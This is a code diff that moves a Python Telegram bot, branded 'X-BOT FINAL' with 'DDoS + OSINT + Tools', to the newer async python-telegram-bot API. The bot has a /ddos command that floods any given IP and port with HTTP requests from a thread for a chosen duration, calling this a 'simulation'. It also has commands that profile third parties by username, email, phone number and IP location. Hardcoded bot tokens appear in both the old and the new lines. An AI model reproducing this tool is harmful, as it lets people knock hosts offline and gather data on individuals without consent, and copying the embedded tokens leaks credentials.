@@ -1,18 +1,12 @@
-# ============================================
-# X-BOT FINAL + OSINT MODULE - 300+ Lines Version
-# ============================================
-
 import os
 import requests
 import time
-import random
 import threading
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, Filters
+from telegram.ext import Application, CommandHandler, ContextTypes
 
-API_KEY = "8011469894:AAHpejaUd-JIzuRKHM6jcyzTcyLNw5lRxTc"
+API_KEY = "7873607598:AAFnauDKdOQGiaYzb2PIuXe5G65UwCSoCrE"
 
-# Banner
 BANNER = """
 🔥 X-BOT FINAL 🔥
 Advanced Telegram Bot with DDoS + OSINT + Tools
@@ -20,10 +14,10 @@ By: Your Team
 """
 
 # ===================== BASIC COMMANDS =====================
-def start(update: Update, context: CallbackContext):
-    update.message.reply_text(BANNER)
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(BANNER)
 
-def help_command(update: Update, context: CallbackContext):
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_text = """
 📘 Commands:
 /start - Show banner
@@ -35,24 +29,23 @@ def help_command(update: Update, context: CallbackContext):
 /phoneosint <phone> - OSINT on phone number
 /iplookup <ip> - Lookup IP info
 """
-    update.message.reply_text(help_text)
+    await update.message.reply_text(help_text)
 
-def ping(update: Update, context: CallbackContext):
-    update.message.reply_text("✅ Bot is online and ready!")
+async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("✅ Bot is online and ready!")
 
 # ===================== DDoS SIMULATION =====================
 def ddos_attack(ip, port, duration):
     timeout = time.time() + duration
     while time.time() < timeout:
         try:
-            s = requests.get(f"http://{ip}:{port}", timeout=1)
+            requests.get(f"http://{ip}:{port}", timeout=1)
         except:
             pass
 
-
-def ddos(update: Update, context: CallbackContext):
+async def ddos(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(context.args) != 3:
-        update.message.reply_text("Usage: /ddos <ip> <port> <duration>")
+        await update.message.reply_text("Usage: /ddos <ip> <port> <duration>")
         return
 
     ip = context.args[0]
@@ -62,12 +55,12 @@ def ddos(update: Update, context: CallbackContext):
     thread = threading.Thread(target=ddos_attack, args=(ip, port, duration))
     thread.start()
 
-    update.message.reply_text(f"🔥 Simulated DDoS attack on {ip}:{port} for {duration} seconds started!")
+    await update.message.reply_text(f"🔥 Simulated DDoS attack on {ip}:{port} for {duration} seconds started!")
 
 # ===================== OSINT FEATURES =====================
-def user_osint(update: Update, context: CallbackContext):
+async def user_osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(context.args) < 1:
-        update.message.reply_text("Usage: /userosint <username>")
+        await update.message.reply_text("Usage: /userosint <username>")
         return
 
     username = context.args[0].lstrip('@')
@@ -76,18 +69,17 @@ def user_osint(update: Update, context: CallbackContext):
     try:
         response = requests.get(url)
         if response.status_code == 200:
-            result = f"🔍 Username @{username} ditemukan di Telegram.\n"
-            result += f"📎 Link: {url}\n"
+            result = f"🔍 Username @{username} ditemukan di Telegram.\n📎 Link: {url}"
         else:
             result = f"❌ Username @{username} tidak ditemukan."
     except Exception as e:
         result = f"Error: {str(e)}"
 
-    update.message.reply_text(result)
+    await update.message.reply_text(result)
 
-def email_osint(update: Update, context: CallbackContext):
+async def email_osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(context.args) < 1:
-        update.message.reply_text("Usage: /emailosint <email>")
+        await update.message.reply_text("Usage: /emailosint <email>")
         return
 
     email = context.args[0]
@@ -97,19 +89,17 @@ def email_osint(update: Update, context: CallbackContext):
         response = requests.get(hunter_url)
         data = response.json()
         if 'data' in data:
-            result = f"🔍 Email OSINT Result:\n"
-            result += f"📧 Email: {email}\n"
-            result += f"✅ Status: {data['data']['status']}\n"
+            result = f"🔍 Email OSINT Result:\n📧 Email: {email}\n✅ Status: {data['data']['status']}"
         else:
             result = "❌ Email not found."
     except Exception as e:
         result = f"Error: {str(e)}"
 
-    update.message.reply_text(result)
+    await update.message.reply_text(result)
 
-def phone_osint(update: Update, context: CallbackContext):
+async def phone_osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(context.args) < 1:
-        update.message.reply_text("Usage: /phoneosint <phone>")
+        await update.message.reply_text("Usage: /phoneosint <phone>")
         return
 
     phone = context.args[0]
@@ -119,56 +109,50 @@ def phone_osint(update: Update, context: CallbackContext):
         response = requests.get(numverify_url)
         data = response.json()
         if 'valid' in data and data['valid']:
-            result = f"📞 Phone OSINT Result:\n"
-            result += f"🔹 Number: {phone}\n"
-            result += f"📍 Location: {data['location']}\n"
-            result += f"📶 Carrier: {data['carrier']}\n"
+            result = f"📞 Phone OSINT Result:\n🔹 Number: {phone}\n📍 Location: {data['location']}\n📶 Carrier: {data['carrier']}"
         else:
             result = "❌ Invalid phone number."
     except Exception as e:
         result = f"Error: {str(e)}"
 
-    update.message.reply_text(result)
+    await update.message.reply_text(result)
 
-def iplookup(update: Update, context: CallbackContext):
+async def iplookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(context.args) < 1:
-        update.message.reply_text("Usage: /iplookup <ip>")
+        await update.message.reply_text("Usage: /iplookup <ip>")
         return
 
     ip = context.args[0]
     try:
         r = requests.get(f"http://ip-api.com/json/{ip}")
         data = r.json()
-        result = f"🌍 IP Lookup Result:\n"
-        result += f"🔹 IP: {ip}\n"
-        result += f"📍 Country: {data['country']}\n"
-        result += f"🏙 City: {data['city']}\n"
-        result += f"🌐 ISP: {data['isp']}\n"
-        result += f"🛰 Lat/Long: {data['lat']}, {data['lon']}"
+        result = (
+            f"🌍 IP Lookup Result:\n"
+            f"🔹 IP: {ip}\n"
+            f"📍 Country: {data['country']}\n"
+            f"🏙 City: {data['city']}\n"
+            f"🌐 ISP: {data['isp']}\n"
+            f"🛰 Lat/Long: {data['lat']}, {data['lon']}"
+        )
     except Exception as e:
         result = f"Error: {str(e)}"
 
-    update.message.reply_text(result)
+    await update.message.reply_text(result)
 
 # ===================== MAIN =====================
 def main():
-    updater = Updater(API_KEY)
-    dp = updater.dispatcher
+    app = Application.builder().token(API_KEY).build()
 
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("help", help_command))
-    dp.add_handler(CommandHandler("ping", ping))
-    dp.add_handler(CommandHandler("ddos", ddos))
-    dp.add_handler(CommandHandler("userosint", user_osint))
-    dp.add_handler(CommandHandler("emailosint", email_osint))
-    dp.add_handler(CommandHandler("phoneosint", phone_osint))
-    dp.add_handler(CommandHandler("iplookup", iplookup))
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("ping", ping))
+    app.add_handler(CommandHandler("ddos", ddos))
+    app.add_handler(CommandHandler("userosint", user_osint))
+    app.add_handler(CommandHandler("emailosint", email_osint))
+    app.add_handler(CommandHandler("phoneosint", phone_osint))
+    app.add_handler(CommandHandler("iplookup", iplookup))
 
-    updater.start_polling()
-    updater.idle()
+    app.run_polling()
 
 if __name__ == '__main__':
     main()
-
-# EOF - Script ini sudah diupdate dengan OSINT Telegram, email, phone, dan IP
-# Jumlah baris: 300+ ✅ Sesuai aturan
